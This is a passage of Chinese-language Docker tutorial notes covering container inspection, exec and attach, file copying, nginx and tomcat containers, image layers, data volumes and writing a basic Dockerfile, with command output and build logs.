\u0026#34;\u0026#34;, \u0026#34;ShmSize\u0026#34;: 67108864, \u0026#34;Runtime\u0026#34;: \u0026#34;runc\u0026#34;, \u0026#34;ConsoleSize\u0026#34;: [ 0, 0 ], \u0026#34;Isolation\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;CpuShares\u0026#34;: 0, \u0026#34;Memory\u0026#34;: 0, \u0026#34;NanoCpus\u0026#34;: 0, \u0026#34;CgroupParent\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;BlkioWeight\u0026#34;: 0, \u0026#34;BlkioWeightDevice\u0026#34;: [], \u0026#34;BlkioDeviceReadBps\u0026#34;: null, \u0026#34;BlkioDeviceWriteBps\u0026#34;: null, \u0026#34;BlkioDeviceReadIOps\u0026#34;: null, \u0026#34;BlkioDeviceWriteIOps\u0026#34;: null, \u0026#34;CpuPeriod\u0026#34;: 0, \u0026#34;CpuQuota\u0026#34;: 0, \u0026#34;CpuRealtimePeriod\u0026#34;: 0, \u0026#34;CpuRealtimeRuntime\u0026#34;: 0, \u0026#34;CpusetCpus\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;CpusetMems\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;Devices\u0026#34;: [], \u0026#34;DeviceCgroupRules\u0026#34;: null, \u0026#34;DeviceRequests\u0026#34;: null, \u0026#34;KernelMemory\u0026#34;: 0, \u0026#34;KernelMemoryTCP\u0026#34;: 0, \u0026#34;MemoryReservation\u0026#34;: 0, \u0026#34;MemorySwap\u0026#34;: 0, \u0026#34;MemorySwappiness\u0026#34;: null, \u0026#34;OomKillDisable\u0026#34;: false, \u0026#34;PidsLimit\u0026#34;: null, \u0026#34;Ulimits\u0026#34;: null, \u0026#34;CpuCount\u0026#34;: 0, \u0026#34;CpuPercent\u0026#34;: 0, \u0026#34;IOMaximumIOps\u0026#34;: 0, \u0026#34;IOMaximumBandwidth\u0026#34;: 0, \u0026#34;MaskedPaths\u0026#34;: [ \u0026#34;/proc/asound\u0026#34;, \u0026#34;/proc/acpi\u0026#34;, \u0026#34;/proc/kcore\u0026#34;, \u0026#34;/proc/keys\u0026#34;, \u0026#34;/proc/latency_stats\u0026#34;, \u0026#34;/proc/timer_list\u0026#34;, \u0026#34;/proc/timer_stats\u0026#34;, \u0026#34;/proc/sched_debug\u0026#34;, \u0026#34;/proc/scsi\u0026#34;, \u0026#34;/sys/firmware\u0026#34; ], \u0026#34;ReadonlyPaths\u0026#34;: [ \u0026#34;/proc/bus\u0026#34;, \u0026#34;/proc/fs\u0026#34;, \u0026#34;/proc/irq\u0026#34;, \u0026#34;/proc/sys\u0026#34;, \u0026#34;/proc/sysrq-trigger\u0026#34; ] }, \u0026#34;GraphDriver\u0026#34;: { \u0026#34;Data\u0026#34;: { \u0026#34;LowerDir\u0026#34;: \u0026#34;/var/lib/docker/overlay2/5e5a494c7a50b728f7118cdcf59378061bfc825810cc1cdda3a61900898f31d3-init/diff:/var/lib/docker/overlay2/67c73992368fc175a0d2849bc97620a48f90ed375eabe859da0816b8eb4b25cd/diff\u0026#34;, \u0026#34;MergedDir\u0026#34;: \u0026#34;/var/lib/docker/overlay2/5e5a494c7a50b728f7118cdcf59378061bfc825810cc1cdda3a61900898f31d3/merged\u0026#34;, \u0026#34;UpperDir\u0026#34;: \u0026#34;/var/lib/docker/overlay2/5e5a494c7a50b728f7118cdcf59378061bfc825810cc1cdda3a61900898f31d3/diff\u0026#34;, \u0026#34;WorkDir\u0026#34;: \u0026#34;/var/lib/docker/overlay2/5e5a494c7a50b728f7118cdcf59378061bfc825810cc1cdda3a61900898f31d3/work\u0026#34; }, \u0026#34;Name\u0026#34;: \u0026#34;overlay2\u0026#34; }, \u0026#34;Mounts\u0026#34;: [], \u0026#34;Config\u0026#34;: { \u0026#34;Hostname\u0026#34;: \u0026#34;2cb886ae2fa9\u0026#34;, \u0026#34;Domainname\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;User\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;AttachStdin\u0026#34;: false, \u0026#34;AttachStdout\u0026#34;: false, \u0026#34;AttachStderr\u0026#34;: false, \u0026#34;Tty\u0026#34;: false, \u0026#34;OpenStdin\u0026#34;: false, \u0026#34;StdinOnce\u0026#34;: false, \u0026#34;Env\u0026#34;: [ \u0026#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34; ], \u0026#34;Cmd\u0026#34;: [ \u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;while true;do echo hello;sleep 1;done\u0026#34; ], \u0026#34;Image\u0026#34;: \u0026#34;centos\u0026#34;, \u0026#34;Volumes\u0026#34;: null, \u0026#34;WorkingDir\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;Entrypoint\u0026#34;: null, \u0026#34;OnBuild\u0026#34;: null, \u0026#34;Labels\u0026#34;: { \u0026#34;org.label-schema.build-date\u0026#34;: \u0026#34;20210915\u0026#34;, \u0026#34;org.label-schema.license\u0026#34;: \u0026#34;GPLv2\u0026#34;, \u0026#34;org.label-schema.name\u0026#34;: \u0026#34;CentOS Base Image\u0026#34;, \u0026#34;org.label-schema.schema-version\u0026#34;: \u0026#34;1.0\u0026#34;, \u0026#34;org.label-schema.vendor\u0026#34;: \u0026#34;CentOS\u0026#34; } }, \u0026#34;NetworkSettings\u0026#34;: { \u0026#34;Bridge\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;SandboxID\u0026#34;: \u0026#34;09f57f62adb9fc11d121a70bd0484a6e49284692ad39d86ba58d6bd52ffac681\u0026#34;, \u0026#34;HairpinMode\u0026#34;: false, \u0026#34;LinkLocalIPv6Address\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;LinkLocalIPv6PrefixLen\u0026#34;: 0, \u0026#34;Ports\u0026#34;: {}, \u0026#34;SandboxKey\u0026#34;: \u0026#34;/var/run/docker/netns/09f57f62adb9\u0026#34;, \u0026#34;SecondaryIPAddresses\u0026#34;: null, \u0026#34;SecondaryIPv6Addresses\u0026#34;: null, \u0026#34;EndpointID\u0026#34;: \u0026#34;4ac1492efb6c8d55fcc381116917dbb3abcfb5bcde25de84f8efd084ccd018cf\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.17.0.1\u0026#34;, \u0026#34;GlobalIPv6Address\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;GlobalIPv6PrefixLen\u0026#34;: 0, \u0026#34;IPAddress\u0026#34;: \u0026#34;172.17.0.2\u0026#34;, \u0026#34;IPPrefixLen\u0026#34;: 16, \u0026#34;IPv6Gateway\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:11:00:02\u0026#34;, \u0026#34;Networks\u0026#34;: { \u0026#34;bridge\u0026#34;: { \u0026#34;IPAMConfig\u0026#34;: null, \u0026#34;Links\u0026#34;: null, \u0026#34;Aliases\u0026#34;: null, \u0026#34;NetworkID\u0026#34;: \u0026#34;4171a585caf462e0363f1976199c44032198de483e6ec43c17962f490b730c95\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;4ac1492efb6c8d55fcc381116917dbb3abcfb5bcde25de84f8efd084ccd018cf\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.17.0.1\u0026#34;, \u0026#34;IPAddress\u0026#34;: \u0026#34;172.17.0.2\u0026#34;, \u0026#34;IPPrefixLen\u0026#34;: 16, \u0026#34;IPv6Gateway\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;GlobalIPv6Address\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;GlobalIPv6PrefixLen\u0026#34;: 0, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:11:00:02\u0026#34;, \u0026#34;DriverOpts\u0026#34;: null } } } } ]   进入当前正在运行的容器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  # 通常容器都是使用后台方式运行的，需要进入容器，修改一些配置 # 命令 docker exec -it 容器id bashshell $ sdr exec -it 2cb886ae2fa9 /bin/bash [root@2cb886ae2fa9 /]# ls bin etc lib lost+found mnt proc run srv tmp var dev home lib64 media opt root sbin sys usr [root@2cb886ae2fa9 /]# ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 10:32 ? 00:00:00 /bin/sh -c while true;do root 1487 0 0 10:57 pts/0 00:00:00 /bin/bash root 1519 1 0 10:57 ? 00:00:00 /usr/bin/coreutils --cor root 1520 1487 0 10:57 pts/0 00:00:00 ps -ef # 方式二 docker attach 容器id $ sudo docker attach thisisanid # 区别： # exec进入容器后打开了一个新的命令行 # attach进入容器当前正在执行的终端，不会启动新的进程   从容器内拷贝文件到主机上 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  docker cp 容器id:容器内路径 目的主机路径 # 在容器内新建文件 [root@78e4d3ef944f /]# cd /home [root@78e4d3ef944f home]# ls [root@78e4d3ef944f home]# la bash: la: command not found [root@78e4d3ef944f home]# ls -al total 8 drwxr-xr-x 2 root root 4096 Nov 3 2020 . drwxr-xr-x 1 root root 4096 Sep 16 11:09 .. [root@78e4d3ef944f home]# touch test.md # 回到主机，拷贝文件到主机 [root@78e4d3ef944f home]# exit exit $ sdr cp 78e4d3ef944f:/home/test.md /home $ cd /home # 成功拷贝 $ ls lighthouse test.md ubuntu # 拷贝是一个手动过程，可以使用 -v 卷的技术，实现自动同步，即连同内外两个目录   小结 练习 nginx 1 2 3  sdr pull nginx sdr run -d --name nginx-test -p 7788:80 nginx curl localhost:7788   pull nginx镜像 启动一个容器 curl本地7788端口 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  \u0026lt;!--返回以下网页--\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome to nginx!\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; html { color-scheme: light dark; } body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Welcome to nginx!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;If you see this page, the nginx web server is successfully installed and working. Further configuration is required.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;For online documentation and support please refer to \u0026lt;a href=\u0026#34;http://nginx.org/\u0026#34;\u0026gt;nginx.org\u0026lt;/a\u0026gt;.\u0026lt;br/\u0026gt; Commercial support is available at \u0026lt;a href=\u0026#34;http://nginx.com/\u0026#34;\u0026gt;nginx.com\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;em\u0026gt;Thank you for using nginx.\u0026lt;/em\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   外网通过7788端口访问到Linux，然后通过-p 7788:80将7788端口接入容器80端口，从而访问nginx tomcat 1 2  sdr pull tomcat sdr run -d -p 6677:8080 --name tomcat-test tomcat   通过公网ip访问发现404（还是能访问的，只不过是404） sdr exec -it tomcat-test /bin/bash进入容器，发现webapps为空 cp -r webapps.dist/* webapps把实例文档拷贝进去 再次访问公网ip:6677发现成功显示页面 Docker镜像讲解 镜像是什么 镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，它包含运行某个软件所需的所有内容，包括代码、运行时的库、环境变量和配置文件。 所有的应用，直接打包docker镜像，就可以直接跑起来 如何得到镜像：  从远程仓库下载 手动拷贝 自己制作一个镜像DockerFile  Docker镜像加载原理  UnionFS（联合文件系统）  下载的时候看到的一层层的就是这个 UnionFS（联合文件系统）：Union文件系统是一种分层、轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下(unite several directories into a single virtual filesystem)。Union文件系统时Docker镜像的基础。镜像可以通过分层来进行集成，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。 特性：一次同时加载多个文件系统，但从外面看起来，智能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录  Docker镜像加载原理  docker的镜像实际上由一层一层的文件系统组成，这种层级的文件系统UnionFS bootfs(boot file system)主要包含bootloader和kernel，bootloader主要是引导加载kernel，linux刚启动时会加载bootfs文件系统，在Docker镜像的最底层时bootfs。这一层与我们典型的Linux/Unix系统时一样的，包含boot加载器和内核。当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由bootfs转交给内核，此时系统也会卸载bootfs rootfs(root file system)，在bootfs之上，包含的就是典型的Linux系统中的/dev,/proc,/bin,/etc等标准目录和文件。rootfs就是各种不同的操作系统发行版，比如Ubuntu，Centos等等。 平时虚拟机的CentOS有几个G，但是centos镜像只有二百多兆 对于一个精简的OS，rootfs可以很小，只需要包含最基本的命令，工具和程序库就可以，因为底层直接用Host的kernel，自己只需要提供rootfs就可以了。由此可见对于不同的linux发行版，bootfs基本都是一致的，rootfs会有差别，因此不同的发行版可以公用bootfs  分层的镜像  下载镜像时，观察下载的日志输出，发现是一层一层的下载 原因： 资源共享。比如多个镜像都从相同的base镜像构建而来，那么宿主机只需在磁盘上保留一份base镜像，同时内存中也只需要加载一份base镜像，这样就可以为所有的容器服务了，而且镜像的每一层都可以被共享。 查看镜像分层的方式可以通过 docker image inspect 命令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  $ sdr image inspect 22afbacf753d ... \u0026#34;RootFS\u0026#34;: { \u0026#34;Type\u0026#34;: \u0026#34;layers\u0026#34;, \u0026#34;Layers\u0026#34;: [ \u0026#34;sha256:7ac795f5ab480bb362e19552cce3cd9780aba31de91aca50606e381f2b5fdc04\u0026#34;, \u0026#34;sha256:24c3f9ffc7df0db8b16e98211592d96583c39ff5c8ea586350e4bfbb11663bce\u0026#34;, \u0026#34;sha256:ca9d5bcb66762cb171518b1d28b1a2296ba0bd09bc5de8f5eff644a1b8f64043\u0026#34;, \u0026#34;sha256:44dd6b099cde96414b9275866c1a43bbc8e69a29348e0e3501e0e30b4fb73213\u0026#34;, \u0026#34;sha256:b8c503d0b5359439591163e5322340cf600d1eeb9c73214ed6d561b0e4586c58\u0026#34;, \u0026#34;sha256:a4c678688c9ae89a07c707072edf5a8194a5a24e89a298ab0282d587b35aa90a\u0026#34; ] }, \u0026#34;Metadata\u0026#34;: { \u0026#34;LastTagTime\u0026#34;: \u0026#34;0001-01-01T00:00:00Z\u0026#34; } } ]   理解： 所有的Docker镜像都起始于一个基础镜像层，当进行修改或增加新内容时，就会在当前镜像层之上，创建新的镜像层。 eg. 加入基于 Ubuntu Liux 16.04 创建一个新的镜像，这就是新镜像的第一层；如果在该镜像中添加Python包，就会在基础镜像层之上创建第二个镜像层；如果继续添加一个安全补丁，就会创建第三个镜像层。 该镜像当前已经包含3个镜像层，如下图所示： 在添加额外的镜像层的同时，镜像始终保持时当前所有镜像的组合。下图中每个镜像时包含3个文件，而镜像包含了来自两个镜像层的6个文件 上图的镜像层跟之前图中的稍有区别，主要目的是便于展示文件。 下图中展示了一个稍微复杂的三层镜像，在外部看来整个镜像只有6个文件，这是因为最上层中的文件7是文件5的一个更新版本 这种情况下，上层镜像层中的文件覆盖了底层镜像层中的文件。这样就使得文件的更新版本作为一个新镜像层添加到镜像当中。 Docker通过存储引擎（新版本采用快照机制）的方式来实现镜像层堆栈，并保证多镜像层对外展示为统一的文件系统。 Linux上可用的存储引擎有AUFS、Overlay2、Device Mapper、Btrfs以及ZFS。顾名思义，每种存储引擎都基于Linux中对应的文件系统或者设备技术，并且每种存储引擎都有其独有的性能特点。 Docker在Windows上仅支持windowsfilter一种存储引擎，该引擎基于NTFS文件系统之上实现了分层和CoW[1]。 下图展示了与系统显示相同的三层镜像。所有镜像层堆叠并合并，对外提供统一的视图。  特点  Docker镜像都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部 这一层就是通常说的容器层，容器之下的都叫镜像层 commit镜像 1 2  # 和git差不多 docker commit -m=\u0026#34;提交的描述信息\u0026#34; -a=\u0026#34;作者\u0026#34; 容器id 目标镜像名:TAG   容器数据卷 什么是容器数据卷 docker理念：将应用和环境打包成一个镜像 but：如果数据都在容器中，那么容器一删除，数据就会丢失。 –-\u0026gt;需求：数据可以持久化 容器之间可以有一个数据共享技术：Docker容器中产生的数据同步到本地 即卷技术，目录的挂载，将容器内的目录挂载到Linux上 容器的持久化和同步操作，同时容器间也可以数据共享 使用数据卷 1 2 3 4  # docker run -it -v 主机目录:容器内目录 sdr run -it -v /home/ubuntu/test:/home centos /bin/bash   无论容器是否开启，无论正向操作还是反向操作，指定通道文件均正常共享 优点：本地修改，容器自动同步 安装MySQL 详情查看dockerhub解释，其中-e是环境配置，配置root密码之类的 具名和匿名挂载 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  # 匿名挂载 -v 容器内路径 # 自动生成主机目录 $ sdr run -d -P --name nginx-test -v /etc/nginx nginx # -P是随机映射端口 # 卷相关操作 sdr volume [参数] $ sdr volume ls DRIVER VOLUME NAME local e971a7e87e336058a1b2466da64c75d2938c5c6b3b70f07ccc8ea6fbfd005673 # 匿名卷挂载 # 具名挂载 # -v 卷名:容器内路径 $ sdr run -d -P --name nginx02 -v juming-nginx:/etc/nginx nginx $ sdr volume ls DRIVER VOLUME NAME local e971a7e87e336058a1b2466da64c75d2938c5c6b3b70f07ccc8ea6fbfd005673 local juming-nginx   查看具体位置 1 2 3 4 5 6 7 8 9 10 11 12 13  $ sdr volume inspect juming-nginx [ { \u0026#34;CreatedAt\u0026#34;: \u0026#34;2022-09-20T01:09:40+08:00\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Labels\u0026#34;: null, \u0026#34;Mountpoint\u0026#34;: \u0026#34;/var/lib/docker/volumes/juming-nginx/_data\u0026#34;, \u0026#34;Name\u0026#34;: \u0026#34;juming-nginx\u0026#34;, \u0026#34;Options\u0026#34;: null, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34; } ] # mountpoint就是具体挂载地址   所有docker容器内的卷，在没有指定目录的情况下都是在/var/lib/docker/volumes/xxxx/_data 1 2 3 4  cd /var/lib/docker/volumes root@VM-4-3-ubuntu:/var/lib/docker/volumes# ls backingFsBlockDev juming-nginx e971a7e87e336058a1b2466da64c75d2938c5c6b3b70f07ccc8ea6fbfd005673 metadata.db   一般都是具名挂载，方便找到卷，或者自定主机路径 拓展： 1 2 3 4 5 6 7 8  # 有时会在容器后再加参数ro rw ro：readonly rw：readwrite # 参数是对容器生效，ro指该文件只能从外部改变 sdr run -d -P --name nginx02 -v juming-nginx:/etc/nginx:ro nginx sdr run -d -P --name nginx02 -v juming-nginx:/etc/nginx:rw nginx   Dockerfile初识 Dockerfile是用来构建docker镜像的构建文件，是命令脚本 通过这个脚本可以生成镜像，镜像一层一层的，脚本一个一个的命令，每个命令都是一层 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  $ mkdir docker-test-volume $ cd docker-test-volume $ vim dockerfile1 # 这里的每个命令,就是镜像的一层 FROM centos # 挂载数据卷目录 # 通过docker inspect中的mounts查看挂载的目录 VOLUME [\u0026#34;/volume01\u0026#34;,\u0026#34;/volume02\u0026#34;] CMD echo \u0026#34;---end---\u0026#34; CMD /bin/bash $ docker build -f dockerfile1 -t qinm/centos:latest . # -f 设置地址 # -t tag,设置标签 Sending build context to Docker daemon 2.048kB Step 1/4 : FROM centos ---\u0026gt; 5d0da3dc9764 Step 2/4 : VOLUME [\u0026#34;volume01\u0026#34;,\u0026#34;volume02\u0026#34;] ---\u0026gt; Running in 502845653bb0 Removing intermediate container 502845653bb0 ---\u0026gt; cc7399fde6c6 Step 3/4 : CMD echo \u0026#34;---end---\u0026#34; ---\u0026gt; Running in 1c6e2ad7f22b Removing intermediate container 1c6e2ad7f22b ---\u0026gt; 02c44d547986 Step 4/4 : CMD /bin/bash ---\u0026gt; Running in 9fa10a85fe26 Removing intermediate container 9fa10a85fe26 ---\u0026gt; 3f4f6e063605 Successfully built 3f4f6e063605 Successfully tagged qinm/centos:latest   数据卷容器 docker run 时,通过添加参数\\--volumes-from docker名挂载其他容器的数据卷 似乎可以通过 -v 指定要挂载的容器 Dockerfile dockerfile 是用来构建docker镜像的文件,就是一个命令参数脚本 官方镜像都是一些基础镜像,我们需要构建自己的镜像 DockerFile构建过程 基础知识:  每个保留关键字(指令)都最好是大写字母 执行从上到下顺序执行 # 表示注释 每一个指令都会创建提交一个新的镜像层,并提交  dockerfile –\u0026gt;dockerimages –\u0026gt;docker容器 dockerfile指令 1 2 3 4 5 6 7 8 9 10 11 12  FROM\t# 指定基础镜像 MAINTAINER\t# 镜像是谁写的, 姓名+邮箱 RUN\t# 镜像构建的时候需要运行的命令 ADD\t# 步骤,添加其他东西(比如tomcat镜像之类的) WORKDIR\t# 镜像的工作目录 VOLUME\t# 挂载的目录 EXPOSE\t# 指定暴露的端口 CMD\t# 指定这个容器要启动时候要运行的命令,只有最后一个会生效,可被替代 ENTRYPOINT\t# 指定这个容器要启动时候要运行的命令,可以追加命令 ONBUILD\t# 当构建一个被继承 Dockerfile 这个时候会运行该指令,是一个触发指令 COPY\t# 类似add,将我们的文件拷贝到镜像中 ENV\t# 构建的时候设置环境变量   CMD和ENTRYPOINT区别: 1 2 3 4 5  CMD ls -a docker run -l时会将-l替换ls -a ENTRYPOINT ls -a docker run -l时会将-l追加到之后,变为ls -a -l   实操 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  # 编写dockerfile $ vim mydockerfile-centos FROM centos:7 # 需要指定centos:7不然yum会报错 MAINTAINER wnqinm\u0026lt;flidwala@gmail.com\u0026gt; ENV MYPATH /usr/local WORKDIR $MYPATH RUN yum -y install vim RUN yum -y install net-tools EXPOSE 80 CMD /bin/bash $ sdr build -f mydockerfile-centos -t mycentos:latest .   之后会输出以下信息: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327  Sending build context to Docker daemon 2.048kB Step 1/8 : FROM centos:7 7: Pulling from library/centos 2d473b07cdd5: Pull complete Digest: sha256:c73f515d06b0fa07bb18d8202035e739a494ce760aa73129f60f4bf2bd22b407 Status: Downloaded newer image for centos:7 ---\u0026gt; eeb6ee3f44bd Step 2/8 : MAINTAINER wnqinm\u0026lt;flidwala@gmail.com\u0026gt; ---\u0026gt; Running in 3f3163ef6fc6 Removing intermediate container 3f3163ef6fc6 ---\u0026gt; 7cc6b3b953d1 Step 3/8 : ENV MYPATH /usr/local ---\u0026gt; Running in 91d3be697355 Removing intermediate container 91d3be697355 ---\u0026gt; 3c456a5a6c70 Step 4/8 : WORKDIR $MYPATH ---\u0026gt; Running in 34d1a3844471 Removing intermediate container 34d1a3844471 ---\u0026gt; 0aed096774e0 Step 5/8 : RUN yum -y install vim ---\u0026gt; Running in 8ff92ad9ec1e Loaded plugins: fastestmirror, ovl Determining fastest mirrors * base: mirrors.nju.edu.cn * extras: ftp.sjtu.edu.cn * updates: ftp.sjtu.edu.cn Resolving Dependencies --\u0026gt; Running transaction check ---\u0026gt; Package vim-enhanced.x86_64 2:7.4.629-8.el7_9 will be installed --\u0026gt; Processing Dependency: vim-common = 2:7.4.629-8.el7_9 for package: 2:vim-enhanced-7.4.629-8.el7_9.x86_64 --\u0026gt; Processing Dependency: which for package: 2:vim-enhanced-7.4.629-8.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(:MODULE_COMPAT_5.16.3) for package: 2:vim-enhanced-7.4.629-8.el7_9.x86_64 --\u0026gt; Processing Dependency: libperl.so()(64bit) for package: 2:vim-enhanced-7.4.629-8.el7_9.x86_64 --\u0026gt; Processing Dependency: libgpm.so.2()(64bit) for package: 2:vim-enhanced-7.4.629-8.el7_9.x86_64 --\u0026gt; Running transaction check ---\u0026gt; Package gpm-libs.x86_64 0:1.20.7-6.el7 will be installed ---\u0026gt; Package perl.x86_64 4:5.16.3-299.el7_9 will be installed --\u0026gt; Processing Dependency: perl(Socket) \u0026gt;= 1.3 for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(Scalar::Util) \u0026gt;= 1.10 for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl-macros for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(threads::shared) for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(threads) for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(constant) for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(Time::Local) for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(Time::HiRes) for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(Storable) for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(Socket) for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(Scalar::Util) for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(Pod::Simple::XHTML) for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(Pod::Simple::Search) for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(Getopt::Long) for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(Filter::Util::Call) for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(File::Temp) for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(File::Spec::Unix) for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(File::Spec::Functions) for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(File::Spec) for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(File::Path) for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(Exporter) for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(Cwd) for package: 4:perl-5.16.3-299.el7_9.x86_64 --\u0026gt; Processing Dependency: perl(Carp) for package: 4:perl-5.16.3-299.el7_9.x86_64 ---\u0026gt; Package perl-libs.x86_64 4:5.16.3-299.el7_9 will be installed ---\u0026gt; Package vim-common.x86_64 2:7.4.629-8.el7_9 will be installed --\u0026gt; Processing Dependency: vim-filesystem for package: 2:vim-common-7.4.629-8.el7_9.x86_64 ---\u0026gt; Package which.x86_64 0:2.20-7.el7 will be installed --\u0026gt; Running transaction check ---\u0026gt; Package perl-Carp.noarch 0:1.26-244.el7 will be installed ---\u0026gt; Package perl-Exporter.noarch 0:5.68-3.el7 will be installed ---\u0026gt; Package perl-File-Path.noarch 0:2.09-2.el7 will be installed ---\u0026gt; Package perl-File-Temp.noarch 0:0.23.01-3.el7 will be installed ---\u0026gt; Package perl-Filter.x86_64 0:1.49-3.el7 will be installed ---\u0026gt; Package perl-Getopt-Long.noarch 0:2.40-3.el7 will be installed --\u0026gt; Processing Dependency: perl(Pod::Usage) \u0026gt;= 1.14 for package: perl-Getopt-Long-2.40-3.el7.noarch --\u0026gt; Processing Dependency: perl(Text::ParseWords) for package: perl-Getopt-Long-2.40-3.el7.noarch ---\u0026gt; Package perl-PathTools.x86_64 0:3.40-5.el7 will be installed ---\u0026gt; Package perl-Pod-Simple.noarch 1:3.28-4.el7 will be installed --\u0026gt; Processing Dependency: perl(Pod::Escapes) \u0026gt;= 1.04 for package: 1:perl-Pod-Simple-3.28-4.el7.noarch --\u0026gt; Processing Dependency: perl(Encode) for package: 1:perl-Pod-Simple-3.28-4.el7.noarch ---\u0026gt; Package perl-Scalar-List-Utils.x86_64 0:1.27-248.el7 will be installed ---\u0026gt; Package perl-Socket.x86_64 0:2.010-5.el7 will be installed ---\u0026gt; Package perl-Storable.x86_64 0:2.45-3.el7 will be installed ---\u0026gt; Package perl-Time-HiRes.x86_64 4:1.9725-3.el7 will be installed ---\u0026gt; Package perl-Time-Local.noarch 